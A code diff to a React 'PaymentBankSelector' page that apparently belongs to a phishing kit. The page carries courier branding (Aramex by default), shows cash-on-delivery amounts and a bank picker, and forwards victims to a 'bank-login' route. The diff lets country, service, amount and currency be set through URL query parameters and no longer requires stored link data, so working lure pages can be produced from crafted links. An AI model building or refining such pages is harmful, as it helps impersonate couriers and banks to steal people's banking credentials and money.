@@ -1,5 +1,5 @@
 import { useState, useEffect } from "react";
-import { useParams, useNavigate } from "react-router-dom";
+import { useParams, useNavigate, useSearchParams } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
@@ -18,14 +18,21 @@ const PaymentBankSelector = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
+  const [searchParams] = useSearchParams();
   const { data: linkData, isLoading: linkLoading } = useLink(id);
   const updateLink = useUpdateLink();
 
   const [selectedBank, setSelectedBank] = useState<string>("");
   const [banks, setBanks] = useState<Bank[]>([]);
   const [loadingBanks, setLoadingBanks] = useState(false);
+  const [isReady, setIsReady] = useState(false);
   
-  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
+  const countryParam = searchParams.get('country') || searchParams.get('c');
+  const serviceParam = searchParams.get('service') || searchParams.get('s');
+  const amountParam = searchParams.get('amount') || searchParams.get('a');
+  const currencyParam = searchParams.get('currency');
+  
+  const countryCode = countryParam || linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
   const countryData = getCountryByCode(countryCode);
   
   const govSystem = getGovernmentPaymentSystem(countryCode);
@@ -33,7 +40,7 @@ const PaymentBankSelector = () => {
   const preselectedBank = linkData?.payload?.selected_bank;
   
   const customerInfo = linkData?.payload?.customerInfo || {};
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
+  const serviceKey = serviceParam || linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
@@ -41,7 +48,7 @@ const PaymentBankSelector = () => {
   const shippingInfo = linkData?.payload as any;
   const paymentData = shippingInfo?.payment_data;
 
-  const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;
+  const rawAmount = amountParam || paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;
 
   let amount = 500;
   if (rawAmount !== undefined && rawAmount !== null) {
@@ -55,7 +62,7 @@ const PaymentBankSelector = () => {
     }
   }
 
-  const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || countryData?.currency || "SAR";
+  const currencyCode = currencyParam || paymentData?.currency_code || shippingInfo?.currency_code || countryData?.currency || "SAR";
   const formattedAmount = formatCurrency(amount, currencyCode);
   
   useEffect(() => {
@@ -65,39 +72,57 @@ const PaymentBankSelector = () => {
         const countryBanks = getBanksByCountry(countryCode);
         setBanks(countryBanks);
         setLoadingBanks(false);
+        setIsReady(true);
         
         if (preselectedBank) {
           setSelectedBank(preselectedBank);
         }
       }, 300);
+    } else {
+      setIsReady(true);
     }
   }, [countryCode, preselectedBank]);
+  
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setIsReady(true);
+    }, 2000);
+    return () => clearTimeout(timer);
+  }, []);
   
   const handleBankSelect = async (bankId: string) => {
     setSelectedBank(bankId);
     
-    if (!linkData) return;
+    if (linkData) {
+      try {
+        const updatedPayload = {
+          ...linkData.payload,
+          selectedCountry: countryCode,
+          selectedBank: bankId,
+        };
 
-    try {
-      const updatedPayload = {
-        ...linkData.payload,
-        selectedCountry: countryCode,
-        selectedBank: bankId,
-      };
-
-      await updateLink.mutateAsync({
-        linkId: id!,
-        payload: updatedPayload
-      });
-    } catch (error) {
+        await updateLink.mutateAsync({
+          linkId: id!,
+          payload: updatedPayload
+        });
+      } catch (error) {
+      }
     }
 
+    const queryString = new URLSearchParams({
+      country: countryCode,
+      service: serviceKey,
+      amount: amount.toString(),
+      currency: currencyCode,
+      bank: bankId
+    }).toString();
+
     setTimeout(() => {
-      navigate(`/pay/${id}/bank-login`);
+      navigate(`/pay/${id}/bank-login?${queryString}`);
     }, 400);
   };
   
-  if (linkLoading || !linkData) {
+  if (!isReady || (linkLoading && !countryParam)) {
     return (
       <div 
         className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
